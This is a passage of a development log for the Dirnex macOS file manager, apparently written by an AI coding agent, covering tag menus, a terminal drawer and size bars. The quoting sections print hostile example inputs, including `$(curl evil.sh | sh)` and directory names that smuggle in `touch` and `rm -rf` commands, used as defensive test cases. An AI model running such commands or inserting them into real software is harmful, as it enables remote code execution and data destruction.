  because the background is alternating-or-blue and not ours to know.
- **The context menu** (`PanelViewController+ContextMenu`) — the app had none at all. Built from
  `CommandCatalog` via `MainMenuBuilder.commandItem` (made internal), so a right-click item and its
  menu-bar twin cannot drift; nil targets mean `validateMenuItem` greys them out for free (Paste with
  an empty clipboard, everything mutating inside an archive). Two menus: one over an entry, one over
  the empty space (folder-scoped: New Folder, Paste, Add to Hotlist, Synchronize). **Tags is a
  submenu**, rebuilt on open via `NSMenuDelegate` and sharing ⌃T's item builder (`tagMenuItems`) so
  there is one definition of what the tag menu contains. Right-click **takes focus first** — items
  dispatch through the responder chain, so without it a right-click in the inactive pane would run
  against the other one.
- **Retargeting, and the bug in it (found live).** Marks outrank the cursor here, so right-clicking a
  row *inside* the marked set acts on the set, while right-clicking *outside* it collapses onto that
  one row — else you point at one file and operate on others. My first cut called `syncCursorToTable`
  + `updateChrome`, which updated the footer and the cursor but **not the rows**: the footer said
  "7 items" while five rows still rendered bold red, a menu about to act on one file over a pane
  drawing five as chosen. `renderRefresh` fixes it. Third time this pass has been the same lesson —
  *the model changed, and the table is only a renderer.*

**VERIFIED LIVE:** dots identical to Finder's for 1/2/5-tag files (`report.pdf` [Red, Blue] → whole
blue leading, red sliver behind, exactly like the probe's `two.txt`); a long name truncating with an
ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colourless `Quokka`;
adding Green from the right-click **submenu** and watching it become the new lead dot; the entry menu,
the background menu, Paste correctly greyed; right-click inside the marked set keeping all 7; and
right-click outside it collapsing to the clicked row with **every red mark cleared**. 588 core + 33
app tests, swiftformat + swiftlint-strict clean, artifacts removed.
**NEXT (M6 pass 6):** the terminal drawer, or size-visualization mode — the next two `[ ]` items.

Progress (2026-07-15, M6 pass 6 — the sidebar's Tags section): user asked for Finder's Tags list in
the sidebar, gated on View ▸ Show Tags. VERIFIED LIVE. The Finder-tags box was already `[x]`; this is
a follow-on that needed **no new panel code at all** — a tag row is a *search*, not a place, so a
click runs `SpotlightQuery(tags:)` through the same `performSearch` a saved search uses and lands a
results tab titled with the tag. Sections now read Searches / Favorites / Volumes / Servers / **Tags**
(last, where Finder puts it). New `SidebarViewController+Tags.swift`, mirroring the `+Searches` /
`+Servers` split — the main file was 453 lines against the 500 limit, so only the `Row` cases and the
two stored properties an extension cannot hold (`showsAllTags`, `renderedTagNames`) landed there, and
`rebuild()` had to widen to internal (Swift `private` doesn't cross files — the recurring gotcha).
- **`FinderTagColor.displayOrder` (core, +2 tests → 590).** The section needed the order Finder
  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Grey); `allCases` is raw-value order, which is
  Apple's storage indices — it opens on Grey and buries Red. The core had already documented the
  distinction in prose and an existing test even spelled the display order out as a **local literal**
  to assert the indices aren't it; that literal is now the property, so the test pins the real thing.
  `FinderTag.systemTags` (the stock seven, in that order) is the list both the sidebar and ⌃T offer.
- **The ⌃T menu was listing them Grey-first**, while its own comment claimed "that is the order Finder
  lists them" — false since pass 4, and invisible because nobody reads a menu's order as a bug. Now
  shares `FinderTag.systemTags`, so the comment is true and the two surfaces agree.
- **The provider learns *colours*, not just names.** `knownTagNames: Set<String>` became a private
  `[String: FinderTag]` keyed by the lowercased name — which is the shape of the truth the core
  established (a colour belongs to the *name*, system-wide; Finder keeps exactly such a database), so
  the latest sighting wins. Without it every custom tag in the sidebar would draw as a hollow ring;
  with it, live, `Zebra` came out purple. `knownTagNames` survives as a computed property (the search
  sheet's chip completion still wants names), and the stock seven are seeded and **never overwritten**
  by a sighting — a file carrying a malformed colourless `Red` (a shape the core found in the wild)
  must not repaint the sidebar's Red.
- **"All Tags…" appears only when there is something behind it.** Finder can always offer it because
  it knows every tag you own; we know the ones we have *seen* (no public API — the system's list is
  Finder's synced plist, and the core deliberately doesn't read it), so an unconditional row would do
  nothing when clicked on a fresh launch. Expansion is one-way: the row it replaces is the only thing
  that would collapse it, and nobody who asked to see their tags wants to hide them again.
- **Rebuild only on a real change.** The scan notification fires for every directory change in either
  pane on every tab, and almost none discover a new tag; rebuilding regardless would drop the
  sidebar's selection constantly. Same "is this real?" gate the server-activity observer applies.

**VERIFIED LIVE** (fixtures: real `xattr`-written tags in `~/Documents`, an indexed location — `/tmp`
is not indexed, so `mdfind` finds nothing there): the section renders as a pixel match for Finder's;
no "All Tags…" while only stock tags were known (home held `Green, Purple` — both stock, correctly not
custom); browsing to the fixtures made "All Tags…" appear with no relaunch; expanding showed `Zebra`
**purple**; clicking Red opened a "Red" results tab with the 3 fixtures **plus a Red file elsewhere on
the machine** (proving it searches everywhere, like Finder's sidebar tags, not the open folder);
unchecking View ▸ Show Tags removed the section, re-checking restored it. 590 core + 33 app tests,
swiftformat + swiftlint-strict clean, fixtures removed.

Progress (2026-07-15, M6 pass 7 — the terminal-drawer core): the pure, tested foundation of the
drawer, the core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no drawer view, no
SwiftTerm, no menu — this is the shell/cwd/quoting half). **Four new `DirnexCore/Services/` files,
purely additive** (no existing-API change, so the app is untouched and needs no rebuild). User chose
the item and the approach up front: terminal drawer next, and **SwiftTerm** (MIT, macOS 10.15+) as
the embedded emulator — Dirnex's first third-party dependency, landing in pass 8's app target only
(Sparkle 2 is already planned for M7, so a dep is not unprecedented; the core stays dependency-free).
Everything below was **probed against the real thing before any Swift was written** — the pass-1
`git` lesson — and it killed the plan's own design:

- **THE FINDING: there is no shell-integration snippet, and there should not be one.** The plan
  specced "'cd sync back' via shell integration snippet", i.e. the traditional emulator route: have
  the user paste a hook into `~/.zshrc` that prints OSC 7 (`\e]7;file://host/path\a`) at every
  prompt, then parse it out of the terminal's output. SwiftTerm even hands it over pre-parsed. macOS
  ships that hook — but probing `/etc/zshrc` showed it is sourced only via
  `[ -r "/etc/zshrc_$TERM_PROGRAM" ] && . "/etc/zshrc_$TERM_PROGRAM"`, and Apple ships only
  `/etc/zshrc_Apple_Terminal`, so an honest drawer must ship and install its own. **The kernel
  already knows.** `proc_pidinfo(PROC_PIDVNODEPATHINFO)` reports any same-user process's cwd, the
  drawer's shell is our own child, and Dirnex is unsandboxed by design (§2) — so `cd` is visible with
  **no dotfile edits, no snippet, and no cooperation from the shell**: it works on first launch, for
  `fish`/`nushell` as well as `zsh`, and for a `cd` inside a subshell or script. **Measured at
  0.75 µs**, so it can simply be asked whenever the terminal produces output — no timer, no polling
  an idle app. It is also the *safer* half of the choice: OSC 7 is bytes written by whatever runs in
  the terminal (SwiftTerm's own docs warn the contents are "entirely under the control of the remote
  application"), so an `ssh` host or a `cat` of a crafted file could push a path at the panel; the
  kernel cannot be talked into lying about our child's cwd. Nothing parses OSC 7 even though it is
  free. This is the `SSH_ASKPASS` shape again — the plan predicts machinery the OS makes unnecessary.
- **`TerminalShell.swift`** — the launch descriptor (executable, `argv[0]`, environment), pure like
  `GitCommand`'s argv. `$SHELL` is *asked*, never assumed (this very account runs `/bin/bash`; the
  `/bin/zsh` default is only a fallback). **`argv[0]` carries a leading dash** — that is the whole
  login-shell mechanism, and it is why Terminal.app runs `-zsh`: without it `~/.zprofile` never runs,
  and on a stock Mac that is where Homebrew's `shellenv` lives, so the drawer would be missing half
  the user's tools. The dash asks for login and the pty makes it interactive, so no `-l`/`-i`.
  **`TERM_PROGRAM` is load-bearing and naming ourselves honestly is what keeps us out of the user's
  files**: claiming `Apple_Terminal` would buy that OSC 7 emitter at the price of everything else in
  Apple's file — probed: with `TERM_SESSION_ID` set it creates `~/.zsh_sessions/$ID.session`,
  repoints `HISTFILE` at a per-session file, and restores-then-deletes saved session state, i.e. the
  drawer would quietly take over Terminal.app's session bookkeeping and split the user's history.
  `TERM_PROGRAM=Dirnex` names us for what we are, and `/etc/zshrc_Dirnex` does not exist. The
  inherited terminal identity (`TERM_SESSION_ID`, `ITERM_*`, `LC_TERMINAL*`) is **stripped**, because
  Dirnex launched from a terminal (`open`, `xcodebuild`) inherits it and would hand our child
  somebody else's session id.
- **`ShellCommandLine.swift`** — the security-critical half, and the reason it is pure and tested: a
  directory name is **attacker-controlled data** (unzip something from the internet and you can be
  browsing ``$(curl evil.sh | sh)``) and it lands on the command line of an interactive shell.
  POSIX single quotes have no escapes, so only the quote itself needs the classic `'` → `'\''`
  bridge; **`fish` is the exception and the reason `ShellKind` distinguishes it** — its single quotes
  *do* honour backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
  **`^U^K` before the command is a safety measure, not tidiness**: the line editor may hold a
  half-typed command, and appending `cd …` to it would execute *their* words plus ours — someone who
  typed `rm -rf /` and thought better of it would watch us run `rm -rf / cd -- '/x'`. Both keys are
  needed because `bash`'s `^U` only kills *backwards* from the cursor. `cd --` ends option parsing;
  the leading space is a courtesy to `HIST_IGNORE_SPACE` users (off by default, so what actually
  keeps history clean is emitting **nothing** when the shell is already there — the common case).
- **`ShellWorkingDirectory.swift`** — the two syscall reads plus the pure follow policy. `isAtPrompt`
  is `tcgetpgrp` on the pty, which asks exactly the right question — "would my keystrokes reach the
  shell?" — and is the gate that stops Dirnex typing a `cd` into somebody's `vim`. The policy
  compares **resolved** paths on both sides, because a panel showing `/tmp` that tells its shell to
  `cd -- '/tmp'` gets `/private/tmp` back and would "follow" the shell to the place it already was,
  moving the view in response to its own message. A panel inside an archive or on SFTP never follows.
- **`ExternalTerminal.swift`** — the item's "open in iTerm/Terminal/WezTerm as alternative" half,
  `ExternalDiffTool`'s shape verbatim (injected `pathExists`, `installed`/`preferred`, uninstalled ⇒
  absent from the menu rather than an error). Two launch shapes because they are genuinely different
  programs: an app bundle via `open -a <bundle> <dir>` (Terminal, iTerm — macOS registers them as
  folder handlers, so no shell command is typed and no quoting exists on this path) vs a CLI taking a
  flag (`wezterm start --cwd <dir>`). Terminal.app is the always-installed fallback, `FileMerge`'s role.
+36 tests → **626 core tests** (was 590). `swift test` green, swiftformat + swiftlint-strict clean;
app target untouched. **VERIFIED LIVE** — a throwaway harness compiled against the real core driving
a **real login shell in a real pty** (the pass-1 method), 12/12: the kernel saw `cd` with nothing
installed anywhere; the shell followed the panel; the **ping-pong guard held against the real
`/tmp`→`/private/tmp` symlink** (and typed no second `cd`); a directory named ``it's a "test"
$(touch …) `touch …` ;rm -rf boom; & |x`` was entered **verbatim with neither substitution firing**;
`^U^K` cleared an abandoned `echo THIS_MUST_NOT_RUN` which never executed while the `cd` still
landed; `isAtPrompt` read true idle → **false while `sleep` ran** → true again; and the shell itself
reported `TP=Dirnex TERM=xterm-256color V=0.1-harness SESSION=[] CWDFN=[none]` — the inherited
session id stripped and **Apple's `update_terminal_cwd` undefined, proving its dotfile was not
sourced**. `ExternalTerminal` was driven for real too: `open -a Terminal <dir>` opened Terminal with
its shell's cwd exactly on target (read back through this pass's own libproc route), then quit.
GOTCHAS, both harness-only but both instructive: (1) **`fork()` in a process that has touched
libdispatch may only `exec`** — a Swift allocation in the child (building argv/envp) SIGTRAPs, so
every C string must be built *before* the fork; (2) a `DispatchSource` handler written in top-level
code **inherits `@MainActor`** and then trips Swift 6's `dispatch_assert_queue` when it runs on a
background queue — it needs `{ @Sendable in }`. (3) A near-miss worth recording: the harness's own
first cut compared a **raw kernel path against a resolved one** and reported a failure that did not
exist. `URL.resolvingSymlinksInPath` normalizes that pair by *stripping* `/private`, not adding it
(`/private/tmp/x` and `/tmp/x` both → `/tmp/x`), so it agrees with the kernel only when applied to
**both** sides — which the policy does, and a doc note now pins for pass 8, which supplies that closure.
**NEXT (M6 pass 8, the app layer):** add SwiftTerm (v1.14.0) to the app target, a drawer
`NSSplitViewItem` below the panes hosting `LocalProcessTerminalView` (spawned via `TerminalShell`,
`currentDirectory:` at the active pane so opening it types nothing), cwd-follow both ways off
`shellPid`/`childfd` on output-settle, and the `ExternalTerminal` menu items; then the
size-visualization mode.

Progress (2026-07-15, M6 pass 8 — the terminal-drawer app layer; **the box closes `[x]`, VERIFIED
LIVE**): the drawer is real — a login shell in a real pty under the panes, following them both ways.
**Dirnex's first third-party dependency landed** (SwiftTerm v1.14.0, `exactVersion`, MIT), whose
resolved revision was checked against the tag's own hash from `git ls-remote`. That exposed a
`.gitignore` rule that had been harmless until this pass: **`Package.resolved` was blanket-ignored**
— correct while the only package was local `DirnexCore` (a library resolves at its checkout), wrong
the moment the app gained a remote dep, because `exactVersion` pins the *tag* and a tag can be
moved; the resolution file is the only thing pinning the **revision**. Now un-ignored for the app's
copy only (Apple's own rule: apps commit their resolution, libraries don't). Pass 7's four
core files needed **no changes to be used** — the app only supplies the two things a pure core
can't: SwiftTerm's API surface and the OS's answers. Both were **probed before any Swift was
written** (the pass-1 method), and both the plan's own shape and my own first design were corrected
by what the probe said:
- **THE BLOCKER, and a real cost the plan didn't foresee: SwiftTerm needs Xcode 26's Metal
  toolchain.** v1.12.0 added a Metal renderer with `resources: [.process("Apple/Metal/Shaders.metal")]`,
  so Xcode compiles that shader on **every build regardless of whether we ever use it** (we don't —
  `setUseMetal` is opt-in and defaults off; the toolchain is a pure build-time tax). Xcode 26 no
  longer bundles the compiler, so the first build died on `cannot execute tool 'metal'`. The escape
  hatch was v1.11.2, the last release before the renderer — measured, not guessed, at **2,742 added
  lines** across the emulator core, the Mac view and `LocalProcess` since (PTY backpressure, an
  `EV_VANISHED` crash fix, macOS 26 tracking), i.e. a year-old emulator to dodge a download. User
  chose the toolchain: `xcodebuild -downloadComponent MetalToolchain`, **688 MB**, one-time per
  machine — **and a one-line step M7's notarized-DMG CI now needs.** Resolving SwiftTerm also pulls
  `swift-argument-parser` (its `Termcast` demo's dep); it is pinned but never linked.
- **`@preconcurrency` on the SwiftTerm delegate, earned rather than sprinkled.** SwiftTerm is a
  Swift 5 module whose delegate protocol carries no isolation, so a `@MainActor` conformance turns
  the guarantee into a *runtime assertion* — worth checking, not hoping. Read the library: every
  delivery runs on the queue `LocalProcess` is built with, which `LocalProcessTerminalView` leaves
  nil and the library resolves to `DispatchQueue.main` (`dataReceived` via `drainReceivedData`,
  `processTerminated` via a `DispatchSource` on that same queue); the one background-queue call site
  is commented out upstream. The annotation is sound because the code says so.
- **THE BUG LIVE VERIFICATION CAUGHT, on the first run, on this very machine: `LANG=en_UA.UTF-8`,
  and `perl: warning: Setting locale failed.`** macOS lets you pick language and region separately,
  and this account is English-in-Ukraine — a pair for which **no locale exists** (Apple ships
  `en_US`, `uk_UA`, and 81 others; not that one). Pass 7's `localeIdentifier` was honest and the app
  fed it a preference, not a locale. `TerminalShell.usableLocaleIdentifier` now runs it past an
  injected probe (app-side: `newlocale(3)`, **208 ns**, asks the same database the child's
  `setlocale` will, and unlike `setlocale` doesn't touch our own process-global locale) and falls
  back to **`C.UTF-8`** — neutral, because the point of `LANG` is the *codeset*, and inventing
  `en_US` for a Ukrainian user would be a guess about their conventions where `C` is an honest
  absence of one. Verified after: `LANG=[C.UTF-8]`, perl silent, and `Ünïcodé-Хостинг-日本語.txt`
  round-trips intact — Latin, Cyrillic and CJK, all 39 bytes. **This is what the plan's "shell
  integration snippet" would never have found: it is Terminal.app's own famous bug, reproduced
  because we set the same variable.**
- **`TerminalDrawerViewController`** — the thin client. `$SHELL` asked (this account really is
  `/bin/bash` — the login banner proved it live), `execName` with its dash (the process table shows
  `-bash`), `currentDirectory:` at the active pane so **opening the drawer types nothing**, and the
  shell **spawned lazily on first open**, never at window load. `dataReceived` is overridden to ask
  the kernel where the shell is **on every chunk of output — no timer, and an idle app is asked
  nothing**; at 0.75 µs (pass 7) that beats a debounce, since the expensive half (navigating a pane)
  is gated behind an actual change and a `cd` is rare where echoed keystrokes are not.
- **⌃`, and the responder chain doing the work.** User picked it over the ⌃-letter layer the app's
  own popups live on (⌃T/⌃D/⌃Q) — every one of those letters is the shell's (⌃D is EOF, ⌃Q is XON),
  and the drawer is the one surface whose keystrokes belong to somebody else. No stand-aside code
  was needed: a focused terminal leaves **no pane in the responder chain**, so the pane commands
  find no target and disable themselves — *visible in the live Go menu, entirely greyed* — and their
  keys fall through. ⌃D really did reach the shell as EOF. The one place that needed a hand was the
  window's Esc monitor, which would have eaten `vim`'s entire modal interface to close a preview.
- **`ExternalTerminalLauncher`** — `ExternalDiffLauncher` verbatim over the pure model; `Open in
  Terminal` (Go menu, no shortcut, generic title so the registry keeps one title for menu and
  palette alike) opened Terminal.app at the pane's directory, iTerm/WezTerm being absent here.
+6 tests → **632 core tests** (was 626) + 33 app; `swift test` green, swiftformat + swiftlint-strict
clean. Two recurring gotchas re-fired and were paid down rather than suppressed: `validateMenuItem`'s
cyclomatic limit (Go's items moved to `validateNavigationItem`) and `BrowserWindowController`'s
250-line body (Quick View moved to `+QuickView`, mirroring the pane's own split).
**VERIFIED LIVE**, the built app driven end to end: the drawer opened at `~` with **no `cd` typed**;
`cd /usr/local` in the shell walked the pane there **without stealing the keyboard**; clicking the
other pane typed exactly ` cd -- '/Users/oleg/Dev/Common'` (leading space, `--`, POSIX quotes); a
directory named ``it's a "test" $(touch /tmp/PWNED) `touch /tmp/PWNED2` ;rm -rf boom; & |x`` was
typed **verbatim with neither canary created**; the **ping-pong guard held against the real `/tmp`
symlink** (pane stayed on `/tmp`, one `cd`, no second); `isAtPrompt` **typed nothing at all while
`sleep 15` held the foreground**, and nothing retroactively after; `exit` closed the drawer and the
next ⌃` gave a clean screen and a fresh shell **in the active pane's directory**; and ⌘Q left **no
orphaned shell**. GOTCHAS: (1) **a notification banner (`UserNotificationCenter`) taking front makes
Dirnex's window non-key, which greys out *every* pane menu item and swallows ⌘L** — this looked
exactly like a focus bug I had introduced, and I nearly "fixed" a non-bug; re-tested with the banner
gone, clicking a pane row takes focus back correctly. Verify twice before believing a UI symptom.
(2) The drawer's first open was a **four-line sliver** — AppKit gives an item with no saved geometry
its `minimumThickness` — and it was sitting in my own verification screenshots for several passes
before I read them; `shouldSizeTerminalDrawer` now seeds 200 pt on the first open only, the same
first-launch-has-no-autosave trick `shouldCenterPanesDivider` uses. The drawer's height *and* its
open/closed state persist via `NSSplitView` autosave, so a drawer left open reopens with the window
(and spawns its shell then) exactly as the sidebar behaves.
FOLLOW-UP (user, same day): the prompt sat flush against the drawer's left border. SwiftTerm draws
column zero against its own bounds and has **no padding API**, so the view is inset 6 pt and the
container paints the strip — asking the *terminal* for `nativeBackgroundColor` rather than copying a
colour, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
FOLLOW-UP (user, same day): **the drawer beeped on every pane switch** — "like pressing a
non-existent shortcut", which is exactly what it was: `NSSound.beep()`, reached the long way round.
`ShellCommandLine`'s `^U^K` opens the follow-`cd`, and **`bash` binds `^U` to readline's
`unix-line-discard`, which *rings the bell* instead of killing when the cursor is at column zero** —
i.e. at every idle prompt, which is the only state we ever type into. The BEL reaches SwiftTerm,
whose `bell` delegate is `NSSound.beep()`. Fixed by **prefixing one space**, so `^U` always has
something to kill; the space dies with the line. Probed in a real pty before and after, across
`bash`/`zsh` × emacs/vi × empty/half-typed, driving the **actual bytes the shipping code emits**:
the whole matrix has exactly one BEL, `bash` + bare `^U` + empty prompt, and it is gone. **The two
obvious "cleaner" fixes are both wrong, and the pty said so.** `^A^K` (the idiomatic clear-line)
is a **security regression**: in `bash` *vi* mode neither `^A` nor `^K` is bound, so both insert
**literally**, nothing is cleared, and a half-typed `echo CANARY` **executed** with our `cd` appended
— precisely the `rm -rf /` hazard the sequence exists to prevent. `^U` alone leaves the tail of a
line abandoned mid-cursor. Only `^U` is bound in vi-insert, so the fix had to keep it. **Pre-existing
and NOT fixed** (separate from the beep, and invisible to a user in emacs mode): in vi-insert `^K`
inserts literally, so the `cd` never lands and the shell prints `bash: \x0b: command not found` —
today's `^U^K` is equally broken there. +2 tests → **634 core**; the exact-sequence expectations in
`ShellCommandLineTests`/`ShellWorkingDirectoryTests` pin the space, one of them explicitly as the
beep regression. LESSON, the same one as the sliver: **pass 8's live verification watched the `cd`
appear and never noticed the sound**; a screenshot cannot hear, and the drawer is the one surface
that talks back in audio.
FOLLOW-UP (user, same day): **the vi-mode `cd`, which pass 8 logged as "pre-existing and NOT fixed"
— now fixed, and it was worse than logged.** Dumping both keymaps out of the real shells settles the
design question: **neither `bash`'s `vi-insert` nor `zsh`'s `viins` binds any forward kill** — `^K`,
`^A`, `^E` are all `self-insert` in both — so there was never a keystroke to find. Two things the
beep pass missed, both live in shipped code: (1) **`zsh` binds `^U` to `vi-kill-line`, which kills
back only to *where insert mode was entered*.** A user who types a command, hits `ESC`, then `A` to
append has their insert point at end-of-line, so `^U` clears **nothing** and their abandoned words
**execute** with our `cd` glued on — the exact `rm -rf /` hazard the clear-line exists to prevent,
and the same verdict pass 8 handed `^A^K`. Dropping `^K` does not save it. (2) **`^U^K` rings 5–8
BELs in vi *command* mode**, so pass 8's beep fix never held for vi users. Measured over
bash/zsh × emacs/vi × 6 prompt states: old `^U^K` lands **8/18**, executes user text once, **26
BELs**. **Fix: `^C` alone, and the insight is that it is not a keystroke** — it is `VINTR`, turned
into `SIGINT` by the *terminal line discipline* below the editor, so the keymap cannot matter; and
every shell answers `SIGINT` at a prompt with a fresh line **in insert mode**, the only thing that
also rescues a user idling in vi *command* mode (where `cd -- '/x'` is read as editor commands).
**18/18 land, 0 executions, 0 BELs**, driving the bytes `swiftc` actually emits. The
flush hazard is real but does not bite — `SIGINT` flushes the tty input queue, yet the `cd` is
queued *behind* the signal and survived **96/96** across same-write/split-write/delayed. It is safe
to send a signal at all only because `isAtPrompt` (`tcgetpgrp == shell`) already gates every write,
so it can never reach somebody's `vim`. **COST, chosen deliberately by the user over leaving vi
broken:** `SIGINT` redraws the prompt, so a followed `cd` leaves the abandoned prompt above it —
3 pane switches render **7 rows instead of 4** (2 lines per move, not 1), for emacs users too. Only
real moves pay it (`command(toFollow:)` stays silent when the shell is already there). Exact-sequence
tests re-pinned to `^C`; the ding regression now asserts no `^U` exists to ring at all; +1 test that
no keymap-dependent key is ever sent → **635 core**. `fish` reasoned-through but unverified (not
installed). LESSON: **the idiomatic clear-line keys are all bets on a keymap we do not own** — three
passes reached for `^A^K`, `^U^K`, `^U`, and a pty called each one; the only reliable way into a line
editor you do not control is the channel underneath it.
**NEXT (M6 pass 9):** size-visualization mode (ncdu-style bars, async, cached) — the next `[ ]`
item; then Share sheet / "Open With" / Services, and the automation slice that M6's exit criteria
name ("a user-defined convert-to-webp script runs from the palette").

Progress (2026-07-16, M6 pass 9 — the size-visualization core): the pure, tested half of the
size-viz item, the same core-first opener every slice since M4 has used. Box stays `[ ]` (no toggle,
no bar column, no provider, no app wiring) — this is the projection/cache half. **Two new
`DirnexCore/VFS/` files plus one purely-additive method on `DirectoryModel`/`Panel`** (no existing
API changed, so the app is untouched and needs no rebuild). Everything was **probed before any Swift
was written** (the pass-1 method), and the probes corrected both the plan's framing and my own first
design:
- **ncdu's rule, read from its manual instead of from memory — and it is not either/or, it is
  both.** *"Percentage is relative to the size of the current directory, graph is relative to the
  largest item in the current directory."* The two answer different questions and one number cannot
  do both, so `SizeBar` carries **`fraction`** (max-relative — the bar length, which is the only
  reason a bar column is legible when one row dominates) *and* **`share`** (total-relative — the
  label). I had been about to pick one.
- **Logical bytes, deliberately against ncdu's default of allocated disk usage — and the gap is
  real, measured, and runs BOTH ways.** `.git` (thousands of small files) allocates ~2x its logical
  bytes in 4 KB block round-up (ratio 0.513); conversely one **64 MB sparse LMDB file** in
  `DirnexCore/.build` allocates only 27 MB, pulling that whole tree to 1.082. So the choice matters
  and is not cosmetic. It goes to logical anyway because **the bar must agree with the number
  rendered beside it**: a row whose bar is twice its neighbour's while its own size column reads
  smaller is incoherent. ncdu can default to disk usage because it is a disk-usage tool *with no
  size column*; Dirnex is a file manager with one, already showing `FileEntry.byteSize`. Payoff: the
  mode reuses `DirectorySizer` exactly, with no second byte source.
- **Hard links: measured, then deliberately NOT de-duped** (ncdu does). Probed: **zero hardlinked
  files across `/Applications`, `/usr/local`, `/opt/homebrew`**; the only 10 in `~/Dev` are npm's
  `esbuild` binary, linked between `esbuild/bin/` and `@esbuild/darwin-arm64/bin/` *within the same
  `node_modules`* — so a JS tree double-counts one ~10 MB binary, ≈3 % of a 300 MB `node_modules`.
  (dev,ino) bookkeeping to correct a 3 % error that essentially never occurs is not worth it, and
  `FileEntry` carries no device number to key it on.
- **Walk cost tracks ENTRY COUNT, not bytes — the finding that shapes the whole mode.** The real
  `DirectorySizer` walks 1 TB of `~/Movies` in **0.01 s** but 17 GB of `~/Dev` in **7.7 s** (it is
  all `node_modules`); `/Applications` 8.5 s. And **`~` takes 41 s** once hidden rows are shown (68
  directories, not the 17 visible ones — `.lmstudio`, `.android`, `.cache`, `.npm` are all there).
  So bars *must* stream in progressively, and the cache is not a nicety.
- **The brutal dynamic range is a text-mode artifact, not a fact about the data.** In `~`, Movies is
  79 % of the total and at ncdu's 20 character cells **only 1 of 17 rows earns even one filled
  cell** — which is precisely why ncdu grew `--graph-style eighth-block`. We draw in AppKit at
  continuous width, ~8x finer than eighth-blocks, so pass 10 needs only a **minimum-ink rule** (a
  real 17 GB folder must never render as literally nothing).
- **`SizeVisualization`** — shaped like `GitStatusSnapshot`: every scan happens at construction so
  `bar(for:)` is O(1), because a panel asks once per visible row per render. Three properties, each
  pinned by a test. **(1) Unknown is not zero**: an unsized directory has *no* bar rather than a
  zero-width one — collapsing the two paints an unwalked 40 GB folder as empty, and only
  `computedSize` can tell them apart. **(2) Both denominators cover *visible* rows only** — hiding
  dotfiles or typing a filter re-scales everything, because a bar drawn relative to a row you cannot
  see is unexplainable, and shares that silently fail to reach 100 % are worse than shares of what is
  on screen. **(3) It re-scales for free while walks land**: rebuilding the whole projection per
  render needs no incremental bar-width bookkeeping, at the price (accepted, documented) that `share`
  is a share of *what is known so far* and settles as results arrive. The total **saturates** and
  negatives **clamp**, because `SFTPListingParser` builds sizes out of *text* and a panel must not
  trap on a hostile server's arithmetic.
- **`DirectorySizeCache`** — LRU, capacity **512, because the unit of caching here is one
  directory's total** and a size-viz panel stores one per child row: capacity is counted in "several
  panels' worth of children", not in `GitStatusProvider`'s "a few repositories" (8 snapshots), where
  the unit is the repo. Reads are **non-mutating** (eviction ordered by last *store*): the intended
  stale-while-revalidate re-stores on every visit so the orders coincide, and a mispredicted eviction
  costs a re-walk, never a wrong number — worth more than mutating on the render path. The cache is
  explicitly **a latency optimization and never an authority**: we watch only the *displayed*
  directory, so a tree that changes while you look elsewhere is silently stale (ncdu has the same
  property — its scan is a snapshot until `r` — but ncdu *looks* like a snapshot where a file panel
  looks live).
- **The invalidation rule is shaped by what an FSEvents ping actually proves.** Read
  `DirectoryWatcher` rather than assuming: its callback **discards the event paths** and the stream
  is recursive, so the only fact on offer is "something under the watched directory changed". Hence
  `invalidate(under:)` drops every cached total on the same **root-to-leaf line**: the path *and its
  descendants* (the ping does not say which one changed) *and its ancestors* (their totals sum it
  in). **Siblings survive** — that is the whole value. It is the **mirror image of
  `GitStatusSnapshot`'s roll-up**: that pushes a leaf's *status* up the line, this pushes a leaf's
  *staleness* up the same one. Conservative by construction and correct for either caller (an exact
  event path invalidates precisely; a watched root invalidates its whole line), because the trade is
  not symmetric — over-invalidating costs a re-walk, under-invalidating shows a wrong number. It goes
  through `VFSPath.isSelfOrDescendant` (backend-scoped, and right about `/a` vs `/ab`) rather than a
  hand-rolled prefix test.
FINDING (measured, and it added the one API change): **seeding a panel from the cache would have
been slower than having no cache at all.** A seed arrives as a burst of N totals and
`setDirectorySize` re-sorts the entire listing on *every* call — measured on the main actor at
5.7 ms for 68 rows, **284 ms at 1,000, and 2.5 s at 3,000**, quadratic. The cache exists to make bars
appear the instant a directory opens, and naively wired it would have frozen the panel for 2.5 s
doing so. `setDirectorySizes` (bulk, one recompute) measures **4050x faster at 3,000 rows — 2.47 s →
0.61 ms — with byte-identical ordering**, so it is the same answer, not a cheaper one.
+34 tests → **669 core tests** (was 635); `swift test` green, swiftformat + swiftlint-strict clean.
The recurring type-body-length gotcha re-fired and was paid down rather than suppressed: `PanelTests`
crossed its 250-line limit, so the computed-size tests moved to `PanelSizeTests` along the seam the
suite's own `MARK` already drew (the `CopyEngine*Tests` precedent), collapsing a duplicated helper
on the way. **VERIFIED LIVE** — a throwaway harness compiled against the real core, driving real
listings and real walks: the Dirnex repo rendered `DirnexCore` 55.8 % / `build` 43.2 % / `.git`
0.8 %, and `~` rendered Movies 79.2 % (1003.7 GB) / Library 10.3 % / Documents 3.0 %; on both,
**shares summed to exactly 1.000000, exactly one row filled the bar, and it was the heaviest one** —
with `du` agreeing inside the expected logical-vs-allocated gap (1.085 on the repo, 1.000 on Movies).
The cache was driven against a **real filesystem change**: growing `.../a/b/file.bin` from 1 KB to
9 KB and invalidating dropped `/a/b`, `/a` and the root — all three genuinely stale, truth having
moved 1050 → 9050 — while the **sibling survived and was still correct**. GOTCHA (harness-only, but
instructive): the probe **segfaulted on its first run**, in a program containing no unsafe code —
`String(format: "%s", swiftString)`. `%s` expects a C string, and handing it a Swift `String` is
undefined behaviour; `%@` or manual padding is the fix.
**NEXT (M6 pass 10, the app layer):** the panel toggle and the bar column drawn at **continuous
width** with the minimum-ink rule; a `DirectorySizeProvider` owning the cache (off-main walks via
`DirectoryLoader.size`, serialized, streamed in and seeded in bulk through `setDirectorySizes`,
FSEvents → `invalidate(under:)`), stale-while-revalidate on navigation, and no bar on the `..` row
(app-synthesized, so the core projection never sees it). **One policy question the 41 s measurement
forces and the user should settle: does toggling the mode auto-scan every child — ncdu's model,
where you wait for the scan — or scan lazily/on-demand?** Extending `DirectoryWatcher` to deliver
event paths would also keep invalidation surgical instead of dropping a whole line per ping. Then
Share sheet / "Open With" / Services, and the automation slice.

Progress (2026-07-16, M6 pass 10 — the size-visualization app layer; **the box closes `[x]`, VERIFIED
